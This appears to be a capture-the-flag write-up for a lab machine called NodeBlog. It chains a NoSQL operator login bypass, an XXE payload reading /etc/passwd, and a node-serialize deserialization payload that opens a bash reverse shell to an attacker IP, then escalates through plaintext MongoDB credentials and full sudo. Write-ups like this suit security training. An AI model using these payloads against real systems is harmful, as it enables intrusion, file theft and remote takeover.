# NodeBlog

**Difficulty:** Medium | **OS:** Linux | **IP:** `10.129.96.160`

## Summary
**NodeBlog** is a medium-difficulty Linux machine that highlights multiple application security flaws in a Node.js environment, including NoSQL injection authentication bypasses, XML External Entity (XXE) data disclosure, and insecure Node.js object deserialization leading to Remote Code Execution (RCE). Initial access is achieved by bypassing authentication through JSON query operators, exploiting an XML upload parser to read system files via XXE, and executing a command injection payload through insecure cookie serialization. Privilege escalation to `root` is completed by querying an internal MongoDB instance to harvest administrative credentials and abusing full `sudo` execution rights.

## Reconnaissance

### Port Scanning (Nmap)
We begin by enumerating active TCP ports and identifying service versions:

- **22**: SSH (OpenSSH 8.2p1 (Ubuntu 4ubuntu0.3))
- **5000**: HTTP (Node.js Express Application)

### Web Application Enumeration
1) Visiting `http://10.129.96.160:5000/` presents a blog platform application built with Node.js.
2) Attempting authentication returns distinct error responses for invalid usernames versus incorrect passwords, confirming user enumeration capabilities.
3) Submitting standard single quotes (`'`) does not trigger SQL syntax errors, indicating the application relies on a NoSQL document store (MongoDB) rather than a relational database.

## Exploitation (Initial Access)

### NoSQL Authentication Bypass
Because the application parses incoming JSON body parameters directly into NoSQL query filters without proper sanitization, operators can be injected.

- **Vulnerability Mechanism:** Submitting query operators like "$ne" (not equal) alters the logical evaluation of the database lookup, allowing an attacker to authenticate as the admin user without knowing the password:

```
{"user":"admin","password":{"$ne" : "null"}}
```

- **Result:** Successful authentication grants access to the administrative dashboard, which includes post creation and file upload capabilities.

### XML External Entity (XXE) Injection
The post-creation and upload features process XML payloads and return parsed feedback. Providing an invalid format triggers an explicit example template:

```
<post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
```

- **Vulnerability Mechanism:** The XML parser is configured to accept and evaluate external entity definitions (`DOCTYPE` declarations) before rendering content.
- **Execution:** Injecting an external entity referencing system files allows reading arbitrary local files via the application's response:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<post><title>Example Post</title><description>Example Description</description><markdown>&xxe;</markdown></post>
```

The contents of `/etc/passwd` are rendered directly on the web page.

### Node.js Deserialization Remote Code Execution (RCE)
Inspecting browser cookies reveals a JSON string containing user state and a signature:

```
{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```

- **Vulnerability Mechanism:** The application uses insecure serialization/deserialization libraries (such as node-serialize) that evaluate Immediately Invoked Function Expressions (IIFEs) embedded within serialized JSON structures.
- **Execution:**

  1) Crafting a malicious serialized payload containing a `Node.js` child_process execution command:

  ```
  {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.14.28/443 0>&1\"', function(error, stdout, stderr){console.log(stdout)});}()"}
  ```

  2) Encoding the payload for URL transport and replacing the session cookie triggers immediate server-side execution.
  3) Catching the incoming connection on an active listener establishes an interactive shell under the application service user account, allowing retrieval of `user.txt`.

## Privilege Escalation (Root Flag)

### MongoDB Credential Enumeration
Enumerating internal services reveals an active MongoDB instance running locally. Accessing the database client (`mongo`) permits querying application collections for stored configuration or user credentials.

- **Extracted Credentials:** Inspecting the database records reveals an administrator record containing a plain-text password:

```
{ "username" : "admin", "password" : "IppsecSaysPleaseSubscribe" }
```

### Sudo Privilege Abuse
Checking assigned `sudo` execution rights for the administrative account via `sudo -l`:

```
User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
```

The administrative account holds unrestricted `sudo` permissions across all commands.
Switching directly to the root user context:

```
sudo su
```

Full administrative root access is acquired, enabling retrieval of `root.txt` from `/root/root.txt`.
